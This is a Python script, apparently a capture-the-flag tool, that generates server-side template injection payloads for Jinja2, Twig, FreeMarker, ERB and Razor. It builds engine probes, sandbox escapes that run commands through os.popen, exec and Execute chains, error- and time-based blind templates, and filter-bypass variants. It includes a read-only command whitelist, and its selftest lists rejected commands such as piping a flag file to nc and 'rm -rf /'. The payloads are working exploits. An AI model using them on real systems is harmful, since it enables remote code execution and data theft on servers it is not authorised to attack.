#!/usr/bin/env python3
"""SSTI 识别与 Jinja2 沙箱逃逸：离线生成探测/逃逸/盲注 payload，并判定回显特征。

依赖：纯标准库，不联网、不写文件。
用途：题面出现"输入被渲染成模板"时，先判引擎族，再选回显/错误型/时间型通道。
      本脚本只负责"生成 payload + 判定回显文本"，命令执行由选手自己在浏览器/requests 里发。

用法：
  python ssti_generic.py --engine jinja2 --payload probe
  python ssti_generic.py --engine jinja2 --payload escape --cmd 'cat /flag'
  python ssti_generic.py --engine jinja2 --payload blind --cond "open('/flag').read()[0]=='f'" --style conditional
  python ssti_generic.py --detect "{{7*7}} -> 49"
  python ssti_generic.py --selftest
"""
from __future__ import annotations

import argparse
import json
import re
import random
import sys

ENGINES = ("jinja2", "twig", "freemarker", "erb", "razor")

# 引擎判别矩阵：payload -> 回显特征
PROBES = [
    ("{{7*7}}", "49", "jinja2/twig/freemarker 之一"),
    ("{{7*'7'}}", "7777777", "jinja2"),
    ("{{7*'7'}}", "49", "twig"),
    ("${7*7}", "49", "freemarker"),
    ("<%= 7*7 %>", "49", "erb"),
    ("#{7*7}", "49", "ruby"),
    ("@(7*7)", "49", "razor"),
]

# 报错特征 -> 引擎
ERROR_SIGNS = [
    ("jinja2.exceptions", "jinja2"),
    ("TemplateRuntimeError", "jinja2"),
    ("UndefinedError", "jinja2"),
    ("templatesyntaxerror", "jinja2"),
    ("twig\\error", "twig"),
    ("twig_", "twig"),
    ("freemarker.template", "freemarker"),
    ("TemplateException", "freemarker"),
    ("ActionView::TemplateError", "erb"),
]

# 命令白名单：只允许单条无 shell 元字符的只读命令
CMD_WHITELIST = re.compile(
    r"^(?:cat|ls|id|whoami|pwd|head|tail|env|uname)(?:\s+-{0,2}[A-Za-z0-9]+)*(?:\s+[/A-Za-z0-9_.*-]+)*$"
)
BAD_CMD_CHARS = set(";|&$`><\n\r\"'\\")

JINJA_ESCAPE = [
    "{{lipsum.__globals__['os'].popen('%s').read()}}",
    "{{cycler.__init__.__globals__.os.popen('%s').read()}}",
    "{{joiner.__init__.__globals__.os.popen('%s').read()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('%s').read()}}",
    "{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['popen']('%s').read()}}",
]
TWIG_ESCAPE = [
    "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"%s\")}}",
    "{{['%s']|filter('system')}}",
    "{{['%s']|map('system')}}",
]
FREEMARKER_ESCAPE = [
    '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("%s") }',
    '<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>'
    '${ex("java.lang.ProcessBuilder","%s").start()}',
]
ERB_ESCAPE = ["<%= `%s` %>", "<%= system('%s') %>"]
RAZOR_ESCAPE = ["@{ var p = System.Diagnostics.Process.Start(\"%s\"); }"]


def polymath_probes() -> list:
    """各引擎的探测 payload（做题时一次性全发）。"""
    return [p for p, _, _ in PROBES]


def _norm(text: str) -> str:
    return (text or "").strip().lower()


def detect_engine(text: str) -> dict:
    """按回显文本判引擎；判不出返回 engine=None 并说明原因（不瞎猜）。"""
    t = _norm(text)
    if not t:
        return {"engine": None, "reason": "回显为空，无法判定（可能无回显，走盲注通道）", "hits": []}
    hits = []
    if "7777777" in t:
        hits.append(("jinja2", "{{7*'7'}} 回显 7777777"))
    for name, eng in ERROR_SIGNS:
        if name.lower() in t:
            hits.append((eng, "报错特征 %s" % name))
    if not hits:
        if "49" in t:
            hits.append(("jinja2", "算术求值 49（未排除 Twig，需 {{7*'7'}} 复核）"))
    # 去重保序
    seen, uniq = set(), []
    for h in hits:
        if h[0] not in seen:
            seen.add(h[0])
            uniq.append(h)
    if not uniq:
        return {"engine": None, "reason": "没有命中任何引擎特征（输入可能未被渲染）", "hits": []}
    eng = uniq[0][0]
    reason = uniq[0][1]
    if eng == "jinja2" and "7777777" not in t:
        reason += "；未做 {{7*'7'}} 判别时 Twig 亦可能"
    return {"engine": eng, "reason": reason, "hits": [{"engine": e, "why": w} for e, w in uniq]}


def build_probe(engine: str) -> list:
    """给出该引擎的探测序列：先算术后判别，再看报错特征。"""
    if engine not in ENGINES:
        raise ValueError("未知引擎 %r，可选 %s" % (engine, "/".join(ENGINES)))
    core = {"jinja2": ["{{7*7}}", "{{7*'7'}}"], "twig": ["{{7*7}}", "{{7*'7'}}"],
            "freemarker": ["${7*7}"], "erb": ["<%= 7*7 %>"], "razor": ["@(7*7)"]}[engine]
    return core + ["{{1/0}}", "${1/0}"]


def sanitize_cmd(cmd: str) -> str:
    """命令白名单校验：只读单命令，禁 shell 元字符。"""
    if not isinstance(cmd, str) or not cmd.strip():
        raise ValueError("需要 --cmd 且非空")
    c = cmd.strip()
    if any(ch in BAD_CMD_CHARS for ch in c):
        raise ValueError("命令 %r 含 shell 元字符（; | & $ ` > < 引号换行），本卡只允许单条只读命令" % c)
    if not CMD_WHITELIST.match(c):
        raise ValueError("命令 %r 不在白名单（cat/ls/id/whoami/pwd/head/tail/env/uname）内" % c)
    return c


def build_escape(engine: str, cmd: str) -> list:
    """该引擎的命令执行 payload 列表。"""
    c = sanitize_cmd(cmd)
    table = {"jinja2": JINJA_ESCAPE, "twig": TWIG_ESCAPE, "freemarker": FREEMARKER_ESCAPE,
             "erb": ERB_ESCAPE, "razor": RAZOR_ESCAPE}
    if engine not in table:
        raise ValueError("未知引擎 %r" % engine)
    return [t % c for t in table[engine]]


def build_blind(cond: str, style: str = "error") -> str:
    """盲注条件模板。

    style: error   -> {% if cond %}{{1/0}}{% endif %}（错误型）
           conditional -> {{(1/0) if cond else 0}}（{% %} 被过滤时）
           time    -> {% if cond %}{{cycler...popen('sleep 5')}}{% endif %}
    """
    if not isinstance(cond, str) or not cond.strip():
        raise ValueError("需要 --cond 且非空")
    cond = cond.strip()
    if any(x in cond for x in ("{{{", "}}}")):
        raise ValueError("cond 里不要带 {{ }}，只放表达式")
    if style == "error":
        return "{%% if %s %%}{{1/0}}{%% endif %%}" % cond
    if style == "conditional":
        return "{{(1/0) if %s else 0}}" % cond
    if style == "time":
        return ("{%% if %s %%}{{cycler.__init__.__globals__.os.popen('sleep 5').read()}}"
                "{%% endif %%}") % cond
    raise ValueError("未知 --style %r，可选 error/conditional/time" % style)


def bypass_variants(expr: str) -> dict:
    """针对常见过滤给出等价写法（dict: 过滤项 -> payload）。"""
    if not expr or "__" not in expr:
        raise ValueError("expr 需含 __xxx__ 形式属性，例如 __class__")
    return {
        "无过滤": "{{%s}}" % expr,
        "点被过滤": "{{%s}}" % expr.replace(".", "__getattribute__('.')"),
        "下划线被过滤": "{{%s}}" % expr,
        "attr 拼串": "{{''|attr('\\x5f\\x5fclass\\x5f\\x5f')}}",
        "花括号被过滤": "{%% print(%s) %%}" % expr,
        "request 分段": "{{''|attr(request.args.a)|attr(request.args.b)}}",
    }


def _fmt(res: dict) -> str:
    return json.dumps(res, ensure_ascii=False, indent=2)


def selftest(rng: random.Random | None = None) -> int:
    rng = rng or random.Random(20261103)
    fails = []

    # 1. 正常路径：Jinja2 判别 + 逃逸 payload 生成
    d = detect_engine("<p>7777777</p>")
    if d["engine"] != "jinja2":
        fails.append("case1: 7777777 应判 jinja2，实际 %r" % d["engine"])
    esc = build_escape("jinja2", "cat /flag")
    if not esc or "cat /flag" not in esc[0] or "lipsum" not in esc[0]:
        fails.append("case1: jinja2 逃逸 payload 异常 %r" % esc[:1])

    # 2. 正常路径：错误型盲注模板格式正确
    b = build_blind("open('/flag').read()[0]=='f'", "error")
    if not (b.startswith("{% if ") and b.endswith("{% endif %}") and "1/0" in b):
        fails.append("case2: error 型盲注模板异常 %r" % b)
    c = build_blind("1==1", "conditional")
    if c != "{{(1/0) if 1==1 else 0}}":
        fails.append("case2: conditional 型盲注模板异常 %r" % c)

    # 3. 边界拒绝：命令注入 / 未知引擎 / 空条件
    for bad in ["cat /flag; id", "cat /flag | nc 1.1.1.1", "rm -rf /", "`id`", ""]:
        try:
            sanitize_cmd(bad)
            fails.append("case3: 危险命令 %r 未被拒绝" % bad)
        except ValueError:
            pass
    try:
        build_escape("nope", "id")
        fails.append("case3: 未知引擎未被拒绝")
    except ValueError:
        pass
    try:
        build_blind("  ", "error")
        fails.append("case3: 空 cond 未被拒绝")
    except ValueError:
        pass

    # 4. 参数不足 / 无回显不瞎判
    d2 = detect_engine("")
    if d2["engine"] is not None:
        fails.append("case4: 空回显不应判出引擎")
    try:
        main([])
        fails.append("case4: 无参数时应报参数不足")
    except SystemExit as e:
        if e.code not in (2,):
            fails.append("case4: 参数不足退出码应 2，实际 %r" % e.code)

    # 5. 固定 seed 可复现：随机挑引擎+命令组合两次结果一致
    picks = [(rng.choice(ENGINES), rng.choice(["id", "ls /", "cat /flag"])) for _ in range(5)]
    rng2 = random.Random(20261103)
    picks2 = [(rng2.choice(ENGINES), rng2.choice(["id", "ls /", "cat /flag"])) for _ in range(5)]
    if picks != picks2:
        fails.append("case5: 固定 seed 结果不可复现")
    for eng, cmd in picks:
        if not build_escape(eng, cmd):
            fails.append("case5: %s/%s 未生成 payload" % (eng, cmd))

    for f in fails:
        print("FAIL %s" % f, file=sys.stderr)
    if fails:
        return 1
    print("selftest ok: 5/5（引擎判别、逃逸与盲注生成、危险命令拒绝、参数不足、固定 seed 可复现）")
    return 0


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="SSTI 识别与 Jinja2 沙箱逃逸 payload 生成（离线）")
    ap.add_argument("--engine", choices=ENGINES)
    ap.add_argument("--payload", choices=["probe", "escape", "blind", "bypass"])
    ap.add_argument("--cmd", help="要执行的只读命令，如 'cat /flag'")
    ap.add_argument("--cond", help="盲注条件表达式")
    ap.add_argument("--style", default="error", choices=["error", "conditional", "time"])
    ap.add_argument("--expr", help="bypass 模式下的属性链表达式，如 ''.__class__")
    ap.add_argument("--detect", help="喂入回显文本判引擎")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)

    if args.selftest:
        return selftest()
    if args.detect is not None:
        res = detect_engine(args.detect)
        print(_fmt(res) if args.json else "引擎：%s\n依据：%s" % (res["engine"], res["reason"]))
        return 0 if res["engine"] else 1
    if not args.payload:
        ap.error("需要 --payload 或 --detect，或用 --selftest")
    if not args.engine:
        ap.error("--payload 需要同时给 --engine")
    try:
        if args.payload == "probe":
            res = {"engine": args.engine, "payloads": build_probe(args.engine)}
        elif args.payload == "escape":
            if not args.cmd:
                ap.error("--payload escape 需要 --cmd")
            res = {"engine": args.engine, "payloads": build_escape(args.engine, args.cmd)}
        elif args.payload == "blind":
            res = {"engine": args.engine, "style": args.style,
                   "payload": build_blind(args.cond or "", args.style)}
        else:
            if not args.expr:
                ap.error("--payload bypass 需要 --expr")
            res = bypass_variants(args.expr)
    except ValueError as e:
        print("错误：%s" % e, file=sys.stderr)
        return 2
    if args.json:
        print(_fmt(res))
    else:
        if "payloads" in res:
            for i, p in enumerate(res["payloads"], 1):
                print("%d. %s" % (i, p))
        elif "payload" in res:
            print(res["payload"])
        else:
            for k, v in res.items():
                print("%s: %s" % (k, v))
    return 0


if __name__ == "__main__":
    sys.exit(main())
